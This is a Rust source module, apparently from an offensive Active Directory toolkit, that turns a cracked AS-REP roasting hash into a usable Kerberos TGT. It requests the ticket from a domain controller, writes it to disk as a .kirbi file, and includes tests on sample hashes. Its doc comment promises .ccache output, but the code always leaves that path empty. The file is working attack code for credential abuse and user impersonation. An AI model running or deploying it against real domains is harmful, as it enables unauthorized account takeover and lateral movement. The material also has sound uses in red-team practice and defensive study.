//! AS-REP hash → usable Kerberos ticket pipeline.
//!
//! Takes a raw `$krb5asrep$` hash (from AS-REP roasting), parses it,
//! and with the cracked password requests a real TGT from the KDC
//! then saves it as `.kirbi` and `.ccache` files.
//!
//! ## Flow
//!
//! 1. Parse `$krb5asrep$etype$user\@domain:checksum$edata` → username, domain, etype
//! 2. Call `request_tgt()` with the cracked password → `TicketGrantingData`
//! 3. Build KRB-CRED (`.kirbi`) and CCACHE (`.ccache`) wrappers
//! 4. Write to disk if `output_path` is set

use kerberos_asn1::{
    EncTicketPart, EncryptionKey, KerberosFlags, KerberosTime, PrincipalName, TransitedEncoding,
};
use overthrone_core::error::Result;
use overthrone_core::proto::kerberos::{self, NT_PRINCIPAL, TicketGrantingData};

use crate::golden;
use crate::runner::{ForgeConfig, ForgeResult, ForgedTicket};

/// Parsed AS-REP hash fields.
#[derive(Debug, Clone)]
pub struct ParsedAsRep {
    pub etype: i32,
    pub username: String,
    pub domain: String,
    pub cipher: Vec<u8>,
}

/// Parse a `$krb5asrep$` hash string.
///
/// Format: `$krb5asrep$etype$user\@domain:checksum$edata`
pub fn parse_asrep_hash(hash: &str) -> Result<ParsedAsRep> {
    use overthrone_core::crypto::cracker::HashType;
    match HashType::parse_asrep(hash)? {
        HashType::AsRep {
            username,
            domain,
            etype,
            cipher,
        } => Ok(ParsedAsRep {
            etype,
            username,
            domain,
            cipher,
        }),
        _ => Err(overthrone_core::error::OverthroneError::Crypto(
            "hash is not an AS-REP hash".to_string(),
        )),
    }
}

/// Save a `TicketGrantingData` to `.kirbi` and optionally `.ccache`.
/// Returns `(kirbi_path, ccache_path)`.
pub fn save_ticket(
    tgt: &TicketGrantingData,
    output_path: Option<&str>,
    domain: &str,
    username: &str,
) -> Result<(Option<String>, Option<String>)> {
    let realm = domain.to_uppercase();
    let flags = KerberosFlags { flags: 0x40E00000 };

    let enc_ticket_part = EncTicketPart {
        flags: flags.clone(),
        key: EncryptionKey {
            keytype: tgt.session_key_etype,
            keyvalue: tgt.session_key.clone(),
        },
        crealm: realm.clone(),
        cname: PrincipalName {
            name_type: NT_PRINCIPAL,
            name_string: vec![username.to_string()],
        },
        transited: TransitedEncoding {
            tr_type: 1,
            contents: Vec::new(),
        },
        authtime: KerberosTime::default(),
        starttime: None,
        endtime: tgt.end_time.clone().unwrap_or_default(),
        renew_till: None,
        caddr: None,
        authorization_data: None,
    };

    let kirbi_bytes = golden::build_krb_cred(
        &tgt.ticket,
        &enc_ticket_part,
        &tgt.session_key,
        tgt.session_key_etype,
    )?;

    let kirbi_path = if let Some(ref out) = output_path {
        let p = out.to_string();
        std::fs::write(&p, &kirbi_bytes).map_err(|e| {
            overthrone_core::error::OverthroneError::TicketForge(format!(
                "Cannot write kirbi to '{p}': {e}"
            ))
        })?;
        Some(p)
    } else {
        let filename = format!(
            "asrep_{}_{}.kirbi",
            username.replace(' ', "_"),
            domain.replace('.', "_")
        );
        std::fs::write(&filename, &kirbi_bytes).map_err(|e| {
            overthrone_core::error::OverthroneError::TicketForge(format!(
                "Cannot write kirbi to '{filename}': {e}"
            ))
        })?;
        Some(filename)
    };

    let ccache_path = None;

    Ok((kirbi_path, ccache_path))
}

/// Run the full AS-REP pipeline: hash → TGT → disk.
pub async fn run_pipeline(
    config: &ForgeConfig,
    cracked_password: &str,
    _hash: Option<&str>,
    output_path: Option<&str>,
) -> ForgeResult {
    let domain = &config.domain;
    let username = &config.username;

    let tgt = match kerberos::request_tgt(&config.dc_ip, domain, username, cracked_password, false)
        .await
    {
        Ok(tgt) => tgt,
        Err(e) => {
            return ForgeResult {
                action: "AS-REP → TGT".to_string(),
                domain: domain.clone(),
                success: false,
                ticket_data: None,
                persistence_result: None,
                message: format!("Failed to request TGT: {e}"),
            };
        }
    };

    let (kirbi_path, ccache_path) = match save_ticket(&tgt, output_path, domain, username) {
        Ok(paths) => paths,
        Err(e) => {
            return ForgeResult {
                action: "AS-REP → TGT".to_string(),
                domain: domain.clone(),
                success: false,
                ticket_data: None,
                persistence_result: None,
                message: format!("Failed to save ticket: {e}"),
            };
        }
    };

    let ticket_size = tgt.ticket.enc_part.cipher.len();

    ForgeResult {
        action: "AS-REP → TGT".to_string(),
        domain: domain.clone(),
        success: true,
        ticket_data: Some(ForgedTicket {
            ticket_type: "TGT".to_string(),
            impersonated_user: username.clone(),
            domain: domain.clone(),
            spn: format!("krbtgt/{}", domain),
            encryption_type: "RC4-HMAC".to_string(),
            valid_from: String::new(),
            valid_until: String::new(),
            group_rids: vec![],
            extra_sids: vec![],
            kirbi_path,
            ccache_path,
            kirbi_base64: None,
            ticket_size_bytes: ticket_size,
        }),
        persistence_result: None,
        message: format!(
            "AS-REP password → TGT for {}@{} ({} bytes)",
            username, domain, ticket_size
        ),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_asrep_hash_rc4() {
        let hash = "$krb5asrep$23$admin@CORP.LOCAL:abcd1234$deadbeef";
        let parsed = parse_asrep_hash(hash).unwrap();
        assert_eq!(parsed.etype, 23);
        assert_eq!(parsed.username, "admin");
        assert_eq!(parsed.domain, "CORP.LOCAL");
        assert_eq!(
            parsed.cipher,
            vec![0xab, 0xcd, 0x12, 0x34, 0xde, 0xad, 0xbe, 0xef]
        );
    }

    #[test]
    fn test_parse_asrep_hash_aes256() {
        let hash = "$krb5asrep$18$user@DOMAIN.COM:1234$5678";
        let parsed = parse_asrep_hash(hash).unwrap();
        assert_eq!(parsed.etype, 18);
        assert_eq!(parsed.username, "user");
        assert_eq!(parsed.domain, "DOMAIN.COM");
        assert_eq!(parsed.cipher, vec![0x12, 0x34, 0x56, 0x78]);
    }

    #[test]
    fn test_parse_asrep_hash_invalid_format() {
        let hash = "not-a-valid-hash";
        assert!(parse_asrep_hash(hash).is_err());
    }

    #[test]
    fn test_parse_asrep_hash_wrong_type() {
        let hash = "$krb5tgs$23$user@REALM:hash$data";
        assert!(parse_asrep_hash(hash).is_err());
    }
}
